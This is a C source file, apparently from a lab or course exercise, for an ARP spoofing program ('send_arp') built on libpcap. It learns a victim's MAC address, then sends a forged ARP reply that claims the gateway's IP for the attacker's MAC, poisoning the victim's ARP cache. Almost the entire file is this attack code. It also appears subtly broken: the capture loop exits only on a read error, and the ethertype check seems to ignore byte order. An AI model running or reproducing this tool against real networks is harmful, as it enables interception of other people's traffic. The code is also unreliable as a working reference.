#include <linux/types.h>
#include <linux/socket.h>
#include <linux/ioctl.h>
#include <linux/if_packet.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <libnet.h>
#include <string.h>
#include <pcap.h>
#include "send_arp.h"

void usage(void) {
    printf("Usage : ./send_arp <interface> <sender(victim) ip> <target(gateway) ip>\n");
    printf("sample: ./send_arp wlan0 192.168.10.2 192.168.10.1\n");
    exit(0);
}

/*
1. get my mac, ip
2. send arp req to victim
3. recv arp rep from victim (by parsing ethertype, srcaddr)
    -> then i know the mac addr of victim 
4. send arp rep to victim (src mac == mine, src ip == gateway, )
*/

int main(int argc, char ** argv) {
    if (argc != 4)
        usage();
    
    char * dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    ARP_pkt * arp_request = (ARP_pkt *)malloc(ARP_size);
    memset(arp_request, 0, ARP_size);

    __uint8_t sender_ip[4];             // victim
    __uint8_t sender_mac[6];
    __uint8_t target_ip[4];             // ip addr of gateway
    __uint8_t my_ip[4];
    __uint8_t my_mac[6];

    printf("sender_ip : ");
    str_ip(argv[2], sender_ip);
    printf("target_ip : ");
    str_ip(argv[3], target_ip);
    printf("my_mac : ");
    get_mac(my_mac);
    printf("my_ip : ");
    get_ip(my_ip);
    // 1 complete!

    ARP_req_init(arp_request, my_mac, my_ip, sender_ip);
    ARP_pkt_dump(arp_request);

    pcap_sendpacket(handle, (const u_char *)arp_request, ARP_size);
    free(arp_request);
    // 2 complete!

    while(1) {
        struct pcap_pkthdr * header;
        const u_char * packet;
        int result = pcap_next_ex(handle, &header, &packet);
        ARP_pkt * arp_reply = (ARP_pkt *)malloc(ARP_size);

        // 0 : packets are being read from a live capture, 
        //     and the timeout expired
        if (result == 0) { free(arp_reply); continue; }
        // -1 : an error occurred while reading the packet
        // -2 : there are no more packets to read from the savefile
        if (result == -1 || result == -2) { free(arp_reply); break; }
        const __uint8_t * p = packet;
        memcpy(arp_reply, p, ARP_size);
        // this packet is not ARP packet
        if (arp_reply->type != ETHERTYPE_ARP) { free(arp_reply); continue; }
        
        for(int i=0; i<6; i++)
            sender_mac[i] = arp_reply->s_hw_addr[i];
        free(arp_reply);
    }
    // 3 complete!

    ARP_pkt * arp_attack = (ARP_pkt *)malloc(ARP_size);
    ARP_atk_init(arp_attack, sender_mac, my_mac, target_ip, sender_ip);
    pcap_sendpacket(handle, (const u_char *)arp_attack, ARP_size);
    pcap_close(handle);
    return 0;
}